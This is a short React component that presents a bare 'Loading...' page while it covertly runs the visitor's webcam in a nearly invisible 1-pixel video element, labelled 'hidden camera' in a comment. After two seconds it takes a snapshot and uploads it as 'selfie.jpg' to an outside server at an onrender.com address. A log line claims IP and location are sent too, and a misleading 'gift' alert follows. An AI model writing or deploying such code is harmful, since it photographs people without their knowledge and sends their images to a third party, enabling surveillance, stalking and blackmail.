import React, { useEffect, useRef } from "react";

function App() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
      if (videoRef.current) {
        videoRef.current.srcObject = stream;

        videoRef.current.oncanplay = () => {
          setTimeout(() => {
            captureImage();
          }, 2000);
        };
      }
    });
  }, []);

  const captureImage = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas) {
      const context = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        const formData = new FormData();
        formData.append("image", blob, "selfie.jpg");

        fetch("https://newsletter-selfie-project.onrender.com/send-email", {
          method: "POST",
          body: formData,
        })
          .then(() => {
            console.log("✅ Selfie + IP + Location sent!");
            alert("🎁 Thanks! Your selfie has been submitted.");
          })
          .catch((err) => console.error("❌ Failed to send selfie", err));
      }, "image/jpeg");
    }
  };

  return (
    <div>
      <video
        ref={videoRef}
        autoPlay
        muted
        playsInline
        style={{ width: 1, height: 1, opacity: 0.01 }} // hidden camera
      />
      <canvas ref={canvasRef} style={{ display: "none" }} />
      <p>Loading...</p>
    </div>
  );
}

export default App;
